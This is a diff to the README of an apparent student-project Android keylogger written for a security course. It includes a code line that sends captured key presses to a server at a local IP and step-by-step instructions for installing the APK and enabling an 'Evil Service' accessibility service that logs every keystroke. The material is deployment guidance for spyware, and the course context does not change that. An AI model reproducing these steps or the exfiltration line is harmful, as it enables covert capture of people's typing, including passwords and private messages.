@@ -23,7 +23,8 @@ This is a project implemented as Project for the Information Systems Security Co
         sendLog("http://192.168.1.37:8080/keylog/save", keyLog);
         ```
     1. Replace `192.168.1.37` with the IP of the machine that you deploy `keylogweb` 
-3. You should enable `Evil Service` which listens key press and send them to the server
+3. Build APK and Install it on your Android Device
+4. You should enable `Evil Service` which listens key press and send them to the server
    * after installed the App, you have to open Accessibility settings. (A button named `Evil Service` is added as a shortcut to directly jump accesibility settings.) Then at the bottom of the page, you will see `Evil Service` under Downloaded Services. You should enable Evil Service from there. Then it will works.
-4. You can check your browser and you will see that each key-press on your Android phone will be printed to the web-page. \
+5. You can check your browser and you will see that each key-press on your Android phone will be printed to the web-page. \
    **! Hint:** Do not forget to refresh browser manually. Auto-refresh feature not implemented :)
